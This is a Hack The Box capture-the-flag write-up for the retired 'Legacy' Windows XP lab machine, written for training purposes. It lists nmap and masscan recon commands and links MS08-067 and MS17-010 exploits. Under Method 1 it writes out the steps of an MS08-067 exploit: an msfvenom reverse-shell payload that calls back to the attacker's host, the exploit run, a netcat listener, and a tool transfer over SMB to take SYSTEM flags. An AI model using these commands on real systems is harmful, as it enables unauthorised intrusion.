# Legacy 

**Links:** [1](https://www.hackthebox.com/machines/Legacy)  [2](https://app.hackthebox.com/machines/Legacy)

**Machine ip:** 10.10.10.4

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0a9f2486-def8-4367-a7c3-52d48f4ae128)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.4 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.4 --open

sudo nmap -Pn -n -sV -sC -sU -O -p$ports 10.10.10.4 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f9fb11ab-3893-4b05-9445-a3025431d537)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/56aa3613-f795-4f39-ae91-c937740f5ff4)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3b75c385-baa0-4aae-b31d-fae7e20d48c1)

+ Check **Finding XP Pro SP3 as "Windows-2000-LAN-Manager":** https://community.cisco.com/t5/archived-small-business-support/finding-xp-pro-sp3-as-quot-windows-2000-lan-manager-quot/td-p/3270323.


## Enumeration
```
ls -l /usr/share/nmap/scripts/smb* | grep vuln

nmap --script smb-vuln* -p 139,445 10.10.10.4
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a4ec1a7b-5542-4821-88b7-9220180785e1)


## Exploitation & Gaining Access & Privilege Escalation

### Method 1: [CVE-2008-4250 (ms08-067) / Conficker](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-08-067)
+ Download python exploit from **ms08-067: CVE-2008-4250** [1](https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py) [2](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)
+ Take this shellcode into the script, and replace it with the default.
+ Update the shellcode in the exploit with our own. Copy the shellcode from **shellcode.txt** and overwrite the payload in the exploit.

```
# On the kali attack vm:
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows -o shellcode.txt

python ms08-067.py 10.10.10.4 6 445

nc -lnvp 4444

# On the target machine:
cd Documents and Settings\john\Desktop

type user.txt

cd C:\Documents and Settings\Administrator\Desktop

type root.txt

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/78dea999-1856-426b-afe3-69aad9bab9de)

+ Transfer **whoami.exe** from **/usr/share/windows-binaries/** using **smbserver.py** since XP doesn't have a whoami binary or command.
+ Check if get the NT AUTHORITY\SYSTEM level access.

```
# On the kali attack vm:
smbserver.py win /usr/share/windows-binaries/

# On the target machine:
\\10.10.14.24\win\whoami.exe
```

+ Get both user and root flags.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/168b61ac-c71d-4f60-8568-a9e1223f669a)


### Method 2: CVE-2017-0143 (ms17-010) / Eternal Blue / Shadow Brokers / WannaCry / NotPetya [1](https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script) [2](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/legacy-writeup-w-o-metasploit#d6e0) [3](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010)
+ Try [1](https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script) [2](https://github.com/helviojunior/MS17-010) [3](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)
+ The exploit didn't work on me due to the below impacket errors:
  + [no module named impacket](https://forum.hackthebox.com/t/impacket-module-not-found-but-installed/3561)
  + [package 'dsinternals' requires a different python 2.7.18 not in ' =3.4'](https://medium.com/@CustosClarus/thank-you-i-have-been-able-to-open-the-virtual-env-with-source-impacket-venv-bin-activate-d5945901ce0c)
+ **Alternatively**, [3](https://github.com/c0d3cr4f73r/MS17-010_CVE-2017-0143)  [4](https://github.com/worawit/MS17-010)


### Method 3: CVE-2008-4250 (ms08-067) / Conficker -> Metasploit Solution
+ **windows/smb/ms08_067_netapi:** https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/
  + https://github.com/7h3rAm/7h3rAm.github.io/blob/master/_posts/htb-legacy.md
  + https://readmedium.com/en/https:/theosintion.medium.com/htb-retired-box-walkthrough-legacy-147bbcc9ff02
  + https://medium.com/@JAlblas/hackthebox-legacy-walkthrough-cb067c572a50


### Method 4: CVE-2017-0143 (ms17-010) / Eternal Blue / Shadow Brokers / WannaCry / NotPetya -> Metasploit Solution
+ **exploit/windows/smb/ms17_010_psexec:** https://ethicalhacs.com/legacy-hackthebox-walkthrough/
  + https://bri5ee.sh/hack%20the%20box/2021/05/24/htb-legacy.html
  + https://vostdev.wordpress.com/2021/01/17/htb-legacy-walk-through/
  + https://slv3rfx.com/posts/htb-legacy-writeup/


# References & Alternatives
+ https://vvmlist.github.io/#legacy
+ **ms08-067 / ms17-010:** https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
  + https://systemweakness.com/oscp-preparation-hack-the-box-2-legacy-557dc3f0e384
+ **ms17-010:** https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script
  + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/legacy-writeup-w-o-metasploit
  + https://medium.com/@toneemarqus/legacy-hackthebox-walkthrough-2023-tonee-55189d9f6035
+ **metasploit exploit/windows/smb/ms17_010_psexec:** https://ethicalhacs.com/legacy-hackthebox-walkthrough/
  + https://slv3rfx.com/posts/htb-legacy-writeup/
  + https://bri5ee.sh/hack%20the%20box/2021/05/24/htb-legacy.html
  + https://vostdev.wordpress.com/2021/01/17/htb-legacy-walk-through/
+ **ms08-067:** https://benheater.com/hackthebox-legacy/
+ **metasploit windows/smb/ms08_067_netapi:** https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/
  + https://github.com/7h3rAm/7h3rAm.github.io/blob/master/_posts/htb-legacy.md
  + https://readmedium.com/en/https:/theosintion.medium.com/htb-retired-box-walkthrough-legacy-147bbcc9ff02
  + https://medium.com/@JAlblas/hackthebox-legacy-walkthrough-cb067c572a50
  + https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/
  + https://www.hackingarticles.in/hack-the-box-challenge-legacy-walkthrough/


## CVE Scripting
+ **CVE-2008-4250 (ms08-067) / Conficker:** https://www.exploit-db.com/exploits/40279
    + https://nvd.nist.gov/vuln/detail/cve-2008-4250
    + https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067
    + https://www.rapid7.com/blog/post/2014/02/03/new-ms08-067/
    + https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
  + https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
  + https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
+ **CVE-2017-0143 (ms17-010) / Eternal Blue / Shadow Brokers / WannaCry / NotPetya:** https://www.exploit-db.com/exploits/43970
    + https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
  + https://github.com/helviojunior/MS17-010
    + https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
  + https://github.com/c0d3cr4f73r/MS17-010_CVE-2017-0143
  + https://github.com/worawit/MS17-010
  + https://github.com/3ndG4me/AutoBlue-MS17-010


## Tools
+ **windows-binaries / whoami.exe:** /usr/share/windows-binaries
  + https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#beyond-root---whoami
+ **smbserver.py:** /usr/share/doc/python3-impacket/examples/smbserver.py
  + https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#beyond-root---whoami
+ **impacket:** https://github.com/fortra/impacket


## Technical Knowledge
+ **139,445 - Pentesting SMB:** https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
  + https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
+ **how to exploit the Eternal Blue vulnerability without using Metasploit:** https://ethicalhackingguru.com/how-to-exploit-ms17-010-eternal-blue-without-metasploit/


## Problems Solution
+ https://0xdf.gitlab.io/2021/05/11/htb-blue.html#python-script
+ [no module named impacket](https://forum.hackthebox.com/t/impacket-module-not-found-but-installed/3561)
+ [package 'dsinternals' requires a different python 2.7.18 not in ' =3.4'](https://medium.com/@CustosClarus/thank-you-i-have-been-able-to-open-the-virtual-env-with-source-impacket-venv-bin-activate-d5945901ce0c)
+ https://unix.stackexchange.com/questions/654723/cant-install-python2-modules-kali-2020


## For More
+ **Finding XP Pro SP3 as "Windows-2000-LAN-Manager":** https://community.cisco.com/t5/archived-small-business-support/finding-xp-pro-sp3-as-quot-windows-2000-lan-manager-quot/td-p/3270323
+ https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
+ https://msrc.microsoft.com/blog/2017/05/customer-guidance-for-wannacrypt-attacks/
+ https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/
+ **Shadow Brokers:** https://en.wikipedia.org/wiki/The_Shadow_Brokers
+ **WannaCry ransomware attack:** https://en.wikipedia.org/wiki/WannaCry_ransomware_attack
  + https://darknetdiaries.com/episode/73/
+ https://cwe.mitre.org/data/definitions/680.html
+ https://andyrussellcronin.wordpress.com/2012/04/13/understanding-heap-spraying/
+ https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/
